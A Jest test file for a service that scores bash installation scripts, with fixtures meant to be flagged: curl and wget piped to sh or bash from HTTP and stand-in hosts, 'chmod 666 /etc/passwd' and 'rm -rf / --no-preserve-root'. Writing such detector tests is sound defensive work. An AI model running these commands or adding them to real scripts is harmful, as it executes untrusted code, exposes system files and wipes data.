import { InstallationEvaluationService } from '../src/setup/services/InstallationEvaluationService';
import { promises as fs } from 'fs';
import path from 'path';

// Mock filesystem for controlled testing
jest.mock('fs', () => ({
  promises: {
    readFile: jest.fn(),
    access: jest.fn(),
    mkdir: jest.fn(),
    stat: jest.fn(),
  }
}));

const mockFs = fs as jest.Mocked<typeof fs>;

describe('InstallationEvaluationService', () => {
  let service: InstallationEvaluationService;
  
  // Helper function to mock filesystem with two scripts
  const mockTwoScripts = (script1: string, script2: string = '#!/bin/bash\necho "default safe script"') => {
    mockFs.readFile
      .mockResolvedValueOnce(script1)
      .mockResolvedValueOnce(script2);
  };
  
  beforeEach(() => {
    service = new InstallationEvaluationService();
    jest.clearAllMocks();
  });

  describe('Security Pattern Detection', () => {
    it('should detect unsafe download patterns', async () => {
      const unsafeScript = `#!/bin/bash
curl -sSL https://get.docker.com | sh
wget -O- https://some-script.com | bash
bash <(curl -s https://example.com/install.sh)`;

      mockTwoScripts(unsafeScript);

      const evaluation = await service.evaluateInstallationScripts();
      
      expect(evaluation.scriptEvaluations[0]).toBeDefined();
      const criticalIssues = evaluation.scriptEvaluations[0].lineEvaluations.filter(
        le => le.severity === 'critical' && le.category === 'security'
      );
      
      expect(criticalIssues.length).toBeGreaterThan(0);
      expect(criticalIssues[0].issue).toContain('Unsafe download pattern');
    });

    it('should detect HTTP instead of HTTPS downloads', async () => {
      const httpScript = `#!/bin/bash
wget http://example.com/package.tar.gz
curl -O http://insecure-site.com/script.sh`;

      mockFs.readFile.mockResolvedValueOnce(httpScript);

      const evaluation = await service.evaluateInstallationScripts();
      
      const securityIssues = evaluation.scriptEvaluations[0].lineEvaluations.filter(
        le => le.category === 'security' && le.severity === 'high'
      );
      
      expect(securityIssues.length).toBeGreaterThan(0);
      expect(securityIssues[0].issue).toContain('HTTP instead of HTTPS');
    });

    it('should detect world-writable permissions', async () => {
      const permissionsScript = `#!/bin/bash
chmod 777 /opt/phantom-spire/config
chmod 666 /etc/passwd`;

      mockFs.readFile.mockResolvedValueOnce(permissionsScript);

      const evaluation = await service.evaluateInstallationScripts();
      
      const permissionIssues = evaluation.scriptEvaluations[0].lineEvaluations.filter(
        le => le.issue?.includes('world-writable')
      );
      
      expect(permissionIssues.length).toBeGreaterThan(0);
    });
  });

  describe('Best Practice Detection', () => {
    it('should detect unquoted variables', async () => {
      const unquotedScript = `#!/bin/bash
echo $USER is installing
cd $HOME/phantom-spire
rm -rf $TEMP_DIR/*`;

      mockFs.readFile.mockResolvedValueOnce(unquotedScript);

      const evaluation = await service.evaluateInstallationScripts();
      
      const bestPracticeIssues = evaluation.scriptEvaluations[0].lineEvaluations.filter(
        le => le.category === 'best-practice' && le.issue?.includes('Unquoted variable')
      );
      
      expect(bestPracticeIssues.length).toBeGreaterThan(0);
    });

    it('should detect deprecated backtick syntax', async () => {
      const backtickScript = `#!/bin/bash
VERSION=\`cat version.txt\`
CURRENT_USER=\`whoami\``;

      mockFs.readFile.mockResolvedValueOnce(backtickScript);

      const evaluation = await service.evaluateInstallationScripts();
      
      const backtickIssues = evaluation.scriptEvaluations[0].lineEvaluations.filter(
        le => le.issue?.includes('backtick command substitution')
      );
      
      expect(backtickIssues.length).toBeGreaterThan(0);
    });

    it('should recognize good logging practices', async () => {
      const goodLoggingScript = `#!/bin/bash
log_info "Starting installation"
log_error "Failed to install package"
log_success "Installation completed"`;

      mockFs.readFile.mockResolvedValueOnce(goodLoggingScript);

      const evaluation = await service.evaluateInstallationScripts();
      
      const loggingPractices = evaluation.scriptEvaluations[0].lineEvaluations.filter(
        le => le.passed && le.suggestion?.includes('logging')
      );
      
      expect(loggingPractices.length).toBeGreaterThan(0);
    });
  });

  describe('Error Handling Detection', () => {
    it('should detect commands without error handling', async () => {
      const noErrorHandlingScript = `#!/bin/bash
curl -O https://example.com/package.tar.gz
npm install
apt-get update`;

      mockFs.readFile.mockResolvedValueOnce(noErrorHandlingScript);

      const evaluation = await service.evaluateInstallationScripts();
      
      const errorHandlingIssues = evaluation.scriptEvaluations[0].lineEvaluations.filter(
        le => le.category === 'error-handling' && !le.passed
      );
      
      expect(errorHandlingIssues.length).toBeGreaterThan(0);
    });
  });

  describe('Script Scoring', () => {
    it('should calculate overall score correctly', async () => {
      const perfectScript = `#!/bin/bash
set -euo pipefail

log_info "Starting installation"

if [[ $EUID -eq 0 ]]; then
    log_error "Don't run as root"
    exit 1
fi

if command -v node &> /dev/null; then
    log_success "Node.js found"
else
    log_error "Node.js not found"
    exit 1
fi`;

      mockFs.readFile.mockResolvedValueOnce(perfectScript);

      const evaluation = await service.evaluateInstallationScripts();
      
      expect(evaluation.scriptEvaluations[0].overallScore).toBeGreaterThan(70);
    });

    it('should penalize scripts with critical issues', async () => {
      const problematicScript = `#!/bin/bash
curl -sSL http://get.docker.com | sh
chmod 777 /opt
rm -rf / --no-preserve-root`;

      // Mock both script calls
      mockFs.readFile
        .mockResolvedValueOnce(problematicScript)  // First script
        .mockResolvedValueOnce('#!/bin/bash\necho "safe script"'); // Second script

      const evaluation = await service.evaluateInstallationScripts();
      
      expect(evaluation.scriptEvaluations[0].overallScore).toBeLessThan(50);
      expect(evaluation.scriptEvaluations[0].criticalIssues).toBeGreaterThan(0);
    });
  });

  describe('Compliance Checks', () => {
    it('should detect presence of error handling', async () => {
      const errorHandlingScript = `#!/bin/bash
set -e
trap 'handle_error "Installation failed"' ERR

handle_error() {
    echo "Error: $1"
    exit 1
}`;

      mockFs.readFile.mockResolvedValueOnce(errorHandlingScript);

      const evaluation = await service.evaluateInstallationScripts();
      
      expect(evaluation.complianceChecks.hasErrorHandling).toBe(true);
    });

    it('should detect logging practices', async () => {
      const loggingScript = `#!/bin/bash
log_info "Starting process"
log_error "Something went wrong"`;

      mockFs.readFile.mockResolvedValueOnce(loggingScript);

      const evaluation = await service.evaluateInstallationScripts();
      
      expect(evaluation.complianceChecks.hasLogging).toBe(true);
    });
  });

  describe('Report Generation', () => {
    it('should generate detailed markdown report', async () => {
      const sampleScript = `#!/bin/bash
set -e
log_info "Test script"`;

      mockFs.readFile.mockResolvedValueOnce(sampleScript);

      const report = await service.generateDetailedReport();
      
      expect(report).toContain('# Installation Process Evaluation Report');
      expect(report).toContain('## Executive Summary');
      expect(report).toContain('## Compliance Dashboard');
      expect(report).toContain('## Detailed Script Analysis');
    });

    it('should include appropriate recommendations based on issues found', async () => {
      const problematicScript = `#!/bin/bash
curl -sSL http://example.com | bash
chmod 777 /tmp`;

      mockFs.readFile.mockResolvedValueOnce(problematicScript);

      const evaluation = await service.evaluateInstallationScripts();
      
      expect(evaluation.globalRecommendations.length).toBeGreaterThan(0);
      expect(evaluation.globalRecommendations.some(rec => 
        rec.includes('critical') || rec.includes('security')
      )).toBe(true);
    });
  });

  describe('Multiple Script Analysis', () => {
    it('should evaluate multiple scripts and combine results', async () => {
      const script1 = `#!/bin/bash
set -e
log_info "Script 1"`;
      
      const script2 = `#!/bin/bash
curl -sSL http://bad-site.com | sh`;

      mockFs.readFile
        .mockResolvedValueOnce(script1)  // First script call
        .mockResolvedValueOnce(script2); // Second script call

      const evaluation = await service.evaluateInstallationScripts();
      
      expect(evaluation.scriptEvaluations.length).toBe(2);
      expect(evaluation.overallScore).toBeGreaterThan(0);
      expect(evaluation.overallScore).toBeLessThan(100); // Should be impacted by the bad script
    });
  });

  describe('Edge Cases', () => {
    it('should handle scripts with only comments and empty lines', async () => {
      const commentOnlyScript = `#!/bin/bash
# This is a comment
# Another comment

# Empty lines above`;

      mockFs.readFile.mockResolvedValueOnce(commentOnlyScript);

      const evaluation = await service.evaluateInstallationScripts();
      
      expect(evaluation.scriptEvaluations[0].evaluatedLines).toBe(0);
      expect(evaluation.scriptEvaluations[0].overallScore).toBe(100); // No code to evaluate
    });

    it('should handle scripts that cannot be read', async () => {
      mockFs.readFile.mockRejectedValueOnce(new Error('File not found'));

      const evaluation = await service.evaluateInstallationScripts();
      
      // Should not crash and should handle the error gracefully
      expect(evaluation.scriptsEvaluated).toBe(0);
    });

    it('should handle very long scripts efficiently', async () => {
      const longScript = '#!/bin/bash\n' + 'echo "line"\n'.repeat(10000);
      
      mockFs.readFile.mockResolvedValueOnce(longScript);

      const startTime = Date.now();
      const evaluation = await service.evaluateInstallationScripts();
      const endTime = Date.now();
      
      expect(endTime - startTime).toBeLessThan(5000); // Should complete within 5 seconds
      expect(evaluation.scriptEvaluations[0].totalLines).toBe(10001);
    });
  });
});